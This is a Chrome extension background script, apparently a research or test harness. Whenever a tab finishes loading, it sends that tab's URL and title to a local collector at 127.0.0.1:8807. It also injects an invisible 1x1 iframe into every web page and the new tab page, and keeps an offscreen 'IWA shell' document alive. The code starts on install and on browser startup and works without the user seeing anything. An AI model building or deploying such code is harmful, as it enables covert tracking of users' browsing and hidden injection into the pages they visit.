const IWA = "http://127.0.0.1:8807/iwa/";
const SECRPC = 91556947316803;
const logBuffer = [];

chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
  if (!msg || msg.magic !== SECRPC) return;
  if (msg.method === "recordLog") {
    logBuffer.push(msg.args && msg.args[0]);
    send("secrpc", JSON.stringify(msg.args && msg.args[0]));
    sendResponse({ result: { ok: true } });
    return true;
  }
  if (msg.method === "getLogBuffer") {
    chrome.tabs.query({}).then((tabs) => {
      const capture = tabs
        .filter((t) => t.url && t.url.indexOf("http://127.0.0.1:8807/") !== 0)
        .map((t) => ({ t: Date.now(), m: t.url, n: t.title || "" }));
      sendResponse({ result: logBuffer.concat(capture) });
    });
    return true;
  }
  if (msg.method === "capturePage") {
    const page = (msg.args && msg.args[0]) || {};
    logBuffer.push(page);
    send("page", JSON.stringify(page));
    sendResponse({ result: { ok: true, url: page.url || "" } });
    return true;
  }
  if (msg.method === "hello") {
    sendResponse({ result: { ok: true, path: "chrome.runtime.sendMessage", magic: SECRPC } });
    return true;
  }
  sendResponse({ result: { ok: true, method: msg.method } });
  return true;
});

function send(kind, detail) {
  fetch("http://127.0.0.1:8807/api/iwa", {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ kind, detail }),
  }).catch(() => {});
}

function isNtp(url) {
  return url.indexOf("chrome://new-tab-page") === 0 || url.indexOf("chrome://newtab") === 0;
}

async function ensureOffscreen() {
  const has = chrome.offscreen.hasDocument ? await chrome.offscreen.hasDocument() : false;
  if (has) return;
  await chrome.offscreen.createDocument({
    url: "offscreen.html",
    reasons: ["IFRAME_SCRIPTING"],
    justification: "IWA shell keep-alive",
  });
  send("offscreen", IWA);
}

function plant(tabId, url) {
  if (!tabId || !url) return;
  chrome.scripting.executeScript({
    target: { tabId },
    func: (src) => {
      if (document.getElementById("bruja-iwa") || document.getElementById("bruja-ntp-iwa")) return;
      const frame = document.createElement("iframe");
      const ntp = location.href.indexOf("new-tab") >= 0 || location.href.indexOf("newtab") >= 0;
      frame.id = ntp ? "bruja-ntp-iwa" : "bruja-iwa";
      frame.src = src + "?via=" + encodeURIComponent(location.href);
      frame.setAttribute("style", "position:fixed;width:1px;height:1px;opacity:0;border:0;pointer-events:none;left:-99px;top:-99px");
      (document.body || document.documentElement).appendChild(frame);
    },
    args: [IWA],
  }).catch(() => {});
}

chrome.runtime.onInstalled.addListener(() => { ensureOffscreen().catch(() => {}); });
chrome.runtime.onStartup.addListener(() => { ensureOffscreen().catch(() => {}); });
ensureOffscreen().catch(() => {});

chrome.tabs.onUpdated.addListener((tabId, change, tab) => {
  if (change.status !== "complete" || !tab.url) return;
  if (tab.url.indexOf("http://127.0.0.1:8807/") === 0) return;
  send(isNtp(tab.url) ? "ntp" : "tab", tab.url + "\t" + (tab.title || ""));
  if (tab.url.indexOf("http:") === 0 || tab.url.indexOf("https:") === 0 || isNtp(tab.url)) plant(tabId, tab.url);
});

chrome.tabs.query({}).then((tabs) => {
  tabs.forEach((tab) => {
    if (!tab.url || tab.url.indexOf("http://127.0.0.1:8807/") === 0) return;
    send(isNtp(tab.url) ? "ntp" : "tab", tab.url + "\t" + (tab.title || ""));
    if (tab.url.indexOf("http:") === 0 || tab.url.indexOf("https:") === 0 || isNtp(tab.url)) plant(tab.id, tab.url);
  });
});
